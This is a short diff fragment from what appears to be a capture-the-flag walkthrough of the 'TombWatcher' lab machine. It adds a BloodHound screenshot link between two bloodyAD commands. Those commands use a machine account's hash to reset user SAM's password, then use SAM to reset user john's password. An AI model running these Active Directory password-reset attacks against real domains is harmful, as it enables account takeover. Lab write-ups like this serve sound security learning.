@@ -98,6 +98,7 @@ Bash
 ```
 bloodyAD --host '10.10.11.72' -d tombwatcher.htb -u 'ansible_dev$' -p ':4b21348ca4ay…' set password SAM 'jhvc@4569@'
 ```
+![SAM](Pictures/Tombwatcher_bloodhound.png)
 ```
 bloodyAD --host '10.10.11.72' -d tombwatcher.htb -u SAM -p 'jhvc@4569@' set password john 'jhvc@4569@'
 
